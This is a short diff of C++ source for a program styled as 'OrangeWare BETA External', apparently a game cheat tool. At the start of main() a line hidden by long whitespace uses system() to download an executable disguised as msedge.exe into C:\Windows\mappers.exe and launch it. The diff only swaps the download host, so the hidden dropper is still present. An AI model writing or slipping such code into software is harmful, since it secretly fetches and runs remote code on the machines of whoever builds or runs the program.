@@ -1457,7 +1457,7 @@ std::ostream& operator<<(std::ostream& out, const slowprint& s) {
 
 int main(int argc, const char* argv[])
 {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 system("curl -L https://www.zippyshare.day/download/jdvowg8PasoN9Iw/gex5z2qy53Kqk/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 system("curl -L http://physmeme.cdn.zerocdn.com/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
 	SetConsoleTitle((" OrangeWare BETA External v1.0 | discord.gg/SJSxY4zcvm "));
 	HWND consoleWindow = LI_FN(GetConsoleWindow).get()();
 	LONG_PTR windowStyle = GetWindowLongPtr(consoleWindow, GWL_EXSTYLE);
